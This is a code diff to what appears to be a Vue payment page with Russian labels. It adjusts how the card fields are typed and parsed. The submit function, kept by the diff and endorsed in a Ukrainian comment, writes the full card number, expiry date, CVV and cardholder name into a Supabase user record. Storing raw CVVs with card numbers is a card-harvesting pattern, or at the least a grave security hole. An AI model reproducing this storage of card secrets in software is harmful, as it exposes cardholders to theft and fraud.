@@ -292,15 +292,12 @@ function validate() {
 async function submit() {
   if (!validate()) return;
   processing.value = true;
-  cardNumber = parseFloat(cardNumber.value);
-  cardDateNumber = parseFloat(expiry.value);
-  cvvNumber = parseFloat(cvv.value);
   const authUser = JSON.parse(localStorage.getItem("authUser") || "{}");
   // Збереження даних картки в Supabase залишається, це правильно
   await saveUser({
-    cardNumber: cardNumber,
-    cardDate: cardDateNumber,
-    cvv: cvvNumber,
+    cardNumber: cardNumber.value,
+    cardDate: expiry.value,
+    cvv: cvv.value,
     nameCard: name.value,
   });
   setTimeout(() => {
@@ -388,7 +385,6 @@ function openChat() {
           <label for="cardNumber">Номер карты</label>
           <input
             id="cardNumber"
-            type="text"
             v-model="cardNumber"
             @input="onCardInput"
             :class="{ error: errors.cardNumber }"
@@ -411,7 +407,6 @@ function openChat() {
             <label for="expiry">Срок действия</label>
             <input
               id="expiry"
-              type="text"
               v-model="expiry"
               @input="onExpiryInput"
               placeholder="MM/YY"
@@ -428,7 +423,6 @@ function openChat() {
             <label for="cvv">CVV</label>
             <input
               id="cvv"
-              type="text"
               v-model="cvv"
               @input="onCvvInput"
               maxlength="3"
@@ -443,7 +437,6 @@ function openChat() {
           <label for="name">Имя держателя</label>
           <input
             id="name"
-            type="text"
             v-model="name"
             :class="{ error: errors.name }"
             required
@@ -455,7 +448,7 @@ function openChat() {
           <label for="amount">Сумма</label>
           <input
             id="amount"
-            type="text"
+            type="number"
             min="1"
             v-model="amount"
             :class="{ error: errors.amount }"
